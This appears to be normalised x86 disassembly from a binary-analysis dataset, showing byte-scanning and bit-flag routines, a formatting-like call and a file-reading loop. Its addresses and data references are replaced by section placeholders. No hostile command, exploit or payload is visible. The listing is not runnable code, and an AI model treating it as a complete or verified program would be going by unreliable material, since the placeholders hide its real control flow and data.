mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
or edx 0x2
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x60 ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x5c ] 0x3
jne r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
movzx edx [ rwxdata ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x20 ] edx
jne r-xdata
mov ecx [ ebp - 0x60 ]
or ecx 0x80
mov [ ebp - 0x60 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x68 ] 0xf
jmp r-xdata
cmp [ ebp - 0x5c ] 0x4
jne r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ rwxdata ]
mov eax [ ebp - 0x4 ]
mov [ edx * 4 + rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov eax [ ebp - 0x4 ]
push eax
push r--data
mov ecx [ rwxdata ]
add ecx rwxdata
push ecx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x60 ]
push eax
push r--data
mov ecx [ rwxdata ]
add ecx rwxdata
push ecx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ ebp - 0x20 ]
cmp edx [ rwxdata ]
jge r-xdata
cmp [ ebp - 0x68 ] 0x0
jl r-xdata
cmp [ ebp - 0x5c ] 0x5
jne r-xdata
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x4
mov [ ebp - 0x1c ] eax
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov edx [ ebp - 0x60 ]
or edx 0x40
mov [ ebp - 0x60 ] edx
mov edx [ ebp - 0x3c ]
add edx 0x1
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x3c ]
mov ecx [ eax * 4 + rwxdata ]
mov edx 0xf
sub edx [ ebp - 0x68 ]
mov eax [ ecx * 4 + rwxdata ]
mov ecx edx
shl eax cl
sar eax 0xf
and eax 0x1
je r-xdata
cmp [ ebp - 0x5c ] 0x6
jne r-xdata
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x2
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x60 ]
push ecx
push r--data
mov edx [ rwxdata ]
add edx rwxdata
push edx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
cmp [ ebp - 0x5c ] 0x7
jne r-xdata
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] 0x0
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x8
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
or edx 0x1
mov [ ebp - 0x1c ] edx
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x20 ] ecx
jne r-xdata
mov eax [ ebp - 0x60 ]
or eax 0x20
mov [ ebp - 0x60 ] eax
mov edx [ ebp - 0x68 ]
sub edx 0x1
mov [ ebp - 0x68 ] edx
jmp r-xdata
cmp [ ebp - 0x5c ] 0x8
jne r-xdata
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] 0x0
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x10
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x2
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ ebp - 0x60 ]
push edx
push r--data
mov eax [ rwxdata ]
add eax rwxdata
push eax
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
jmp r-xdata
cmp [ ebp - 0x5c ] 0x9
jne r-xdata
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x20
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x8
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x1
mov [ ebp - 0x1c ] edx
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x20 ] edx
jne r-xdata
mov ecx [ ebp - 0x60 ]
or ecx 0x10
mov [ ebp - 0x60 ] ecx
mov ecx [ ebp - 0x1c ]
shl ecx 0x3
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x68 ] edx
jmp r-xdata
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] 0x0
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x40
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x4
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x10
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x60 ]
push eax
push r--data
mov ecx [ rwxdata ]
add ecx rwxdata
push ecx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x1c ]
cmp [ ebp - 0x68 ] ecx
jge r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] 0x0
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x80
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x20
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x2
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x8
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov edx [ ebp - 0x60 ]
or edx 0x8
mov [ ebp - 0x60 ] edx
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x68 ] 0xf
jmp r-xdata
mov edx [ rwxdata ]
mov eax [ ebp - 0x68 ]
mov cl [ eax + rwxdata ]
mov [ edx + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x100
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x40
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x10
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x1
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x4
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x60 ]
push ecx
push r--data
mov edx [ rwxdata ]
add edx rwxdata
push edx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
jmp r-xdata
cmp [ ebp - 0x68 ] 0x0
jl r-xdata
mov eax [ ebp - 0x68 ]
add eax 0x1
mov [ ebp - 0x68 ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x80
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x20
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x8
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x2
mov [ ebp - 0x1c ] ecx
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x20 ] ecx
jne r-xdata
mov eax [ ebp - 0x60 ]
or eax 0x4
mov [ ebp - 0x60 ] eax
mov ecx [ ebp - 0x3c ]
add ecx 0x1
mov [ ebp - 0x3c ] ecx
jmp r-xdata
mov edx [ ebp - 0x3c ]
mov eax [ edx * 4 + rwxdata ]
mov ecx 0xf
sub ecx [ ebp - 0x68 ]
mov edx [ eax * 4 + rwxdata ]
shl edx cl
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x40
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x10
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
or edx 0x1
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ ebp - 0x60 ]
push edx
push r--data
mov eax [ rwxdata ]
add eax rwxdata
push eax
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x20
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x8
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x20 ] edx
jne r-xdata
mov ecx [ ebp - 0x60 ]
or ecx 0x2
mov [ ebp - 0x60 ] ecx
mov ecx [ ebp - 0x68 ]
sub ecx 0x1
mov [ ebp - 0x68 ] ecx
jmp r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x10
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x60 ]
push eax
push r--data
mov ecx [ rwxdata ]
add ecx rwxdata
push ecx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x8
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x68 ]
add ecx 0x1
mov [ ebp - 0x68 ] ecx
mov edx [ ebp - 0x60 ]
push edx
push r--data
mov eax [ rwxdata ]
add eax rwxdata
push eax
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ ebp - 0x60 ]
or edx 0x1
mov [ ebp - 0x60 ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x4
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x20 ]
cmp eax [ rwxdata ]
jge r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x2
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
or edx 0x1
mov [ ebp - 0x1c ] edx
sub_408da0
push ebp
mov ebp esp
sub esp 0x50
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ rwxdata ] eax
cmp [ rwxdata ] 0x0
jne r-xdata
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
xor eax eax
jmp r-xdata
mov ecx [ rwxdata ]
push ecx
call sub_40c09d
add esp 0x4
mov [ rwxdata ] 0x0
mov [ ebp - 0x18 ] 0x0
mov edx [ ebp - 0xc ]
push edx
call sub_406bf0
add esp 0x4
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ rwxdata ] eax
cmp [ rwxdata ] 0x0
jne r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x18 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ rwxdata ]
push ecx
call sub_40b923
add esp 0x4
test eax eax
jne r-xdata
mov [ rwxdata ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
or edx 0x8000
mov [ ebp - 0x14 ] edx
mov eax [ rwxdata ]
push eax
call sub_40c09d
add esp 0x4
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] eax
